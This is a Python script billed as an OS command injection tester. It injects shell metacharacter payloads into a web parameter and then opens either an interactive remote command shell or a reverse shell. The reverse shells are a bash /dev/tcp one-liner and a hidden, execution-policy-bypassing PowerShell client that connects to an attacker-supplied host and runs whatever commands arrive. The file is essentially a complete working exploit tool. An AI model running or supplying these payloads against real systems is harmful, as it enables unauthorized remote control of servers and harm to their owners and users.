import requests
import argparse
import urllib.parse
import sys
import time

# Injection payloads with a test marker
test_payloads = [
    '; echo INJECTION_TEST',       # semicolon
    '&& echo INJECTION_TEST',      # double ampersand
    '| echo INJECTION_TEST',       # pipe
    '%0a echo INJECTION_TEST',     # newline encoding
]

# Reverse shell payloads (Linux bash and Windows cmd)
reverse_shells = {
    'linux': r"""bash -i >& /dev/tcp/{lhost}/{lport} 0>&1""",
    'windows': r"""powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}; $client.Close()"""
}

def inject_request(url, param, payload, method='GET', data=None):
    # Prepare parameters or data with injection
    if method == 'GET':
        params = {param: payload}
        try:
            resp = requests.get(url, params=params, timeout=10)
            return resp
        except Exception as e:
            print(f"Request error: {e}")
            return None
    elif method == 'POST':
        post_data = data.copy() if data else {}
        post_data[param] = payload
        try:
            resp = requests.post(url, data=post_data, timeout=10)
            return resp
        except Exception as e:
            print(f"Request error: {e}")
            return None
    else:
        print(f"Unsupported method {method}")
        return None

def test_injection(url, param, method, data):
    print(f"[*] Testing parameter '{param}' for injection with {method} method.")
    for payload_suffix in test_payloads:
        # Craft payload assuming vulnerable param accepts some input before injection
        payload = f"test{payload_suffix}"
        resp = inject_request(url, param, payload, method, data)
        if resp and "INJECTION_TEST" in resp.text:
            print(f"[+] Injection vulnerability found with payload: {payload}")
            return True
    print("[-] No injection vulnerability detected.")
    return False

def interactive_shell(url, param, method, data):
    print("[*] Entering interactive shell mode. Type 'exit' to quit.")
    while True:
        cmd = input("shell> ")
        if cmd.strip().lower() == 'exit':
            break
        # Inject the command
        payload = f"test; {cmd}"
        resp = inject_request(url, param, payload, method, data)
        if resp:
            print(resp.text)
        else:
            print("[-] No response.")

def reverse_shell(url, param, method, data, lhost, lport, os_type):
    print(f"[*] Attempting reverse shell for {os_type} to {lhost}:{lport}")
    if os_type not in reverse_shells:
        print(f"[-] Unsupported OS type. Choose from: {list(reverse_shells.keys())}")
        return
    payload_cmd = reverse_shells[os_type].format(lhost=lhost, lport=lport)
    # Usually for reverse shell, command injection needs to be carefully encoded or wrapped
    # Here we just append it after a semicolon
    payload = f"test; {payload_cmd}"
    resp = inject_request(url, param, payload, method, data)
    if resp:
        print("[*] Payload sent, check your listener!")
    else:
        print("[-] Failed to send payload.")

def main():
    parser = argparse.ArgumentParser(description="Advanced OS Command Injection Tester with Reverse Shell")
    parser.add_argument('url', help='Target URL (e.g., http://example.com/vuln.php)')
    parser.add_argument('param', help='Parameter name to test')
    parser.add_argument('--method', choices=['GET', 'POST'], default='GET', help='HTTP method to use (default: GET)')
    parser.add_argument('--data', help='POST data parameters (key=value&key2=value2) (only with POST)')
    parser.add_argument('--mode', choices=['test', 'shell', 'reverse'], default='test', help='Mode: test injection, interactive shell, or reverse shell')
    parser.add_argument('--lhost', help='Listener IP for reverse shell')
    parser.add_argument('--lport', type=int, help='Listener port for reverse shell')
    parser.add_argument('--os', choices=['linux', 'windows'], default='linux', help='Target OS type for reverse shell (default: linux)')

    args = parser.parse_args()

    data = None
    if args.method == 'POST':
        if not args.data:
            print("[-] POST method requires --data argument.")
            sys.exit(1)
        # Parse data key=value&key2=value2 into dict
        data = {}
        for pair in args.data.split('&'):
            if '=' in pair:
                k,v = pair.split('=',1)
                data[k] = v
            else:
                data[pair] = ''

    # Run tests or chosen mode
    if args.mode == 'test':
        vulnerable = test_injection(args.url, args.param, args.method, data)
        if not vulnerable:
            print("[-] No injection detected, exiting.")
    elif args.mode == 'shell':
        vulnerable = test_injection(args.url, args.param, args.method, data)
        if vulnerable:
            interactive_shell(args.url, args.param, args.method, data)
        else:
            print("[-] No injection detected, cannot start shell.")
    elif args.mode == 'reverse':
        if not (args.lhost and args.lport):
            print("[-] Reverse shell mode requires --lhost and --lport.")
            sys.exit(1)
        vulnerable = test_injection(args.url, args.param, args.method, data)
        if vulnerable:
            reverse_shell(args.url, args.param, args.method, data, args.lhost, args.lport, args.os)
        else:
            print("[-] No injection detected, cannot send reverse shell payload.")

if __name__ == "__main__":
    main()
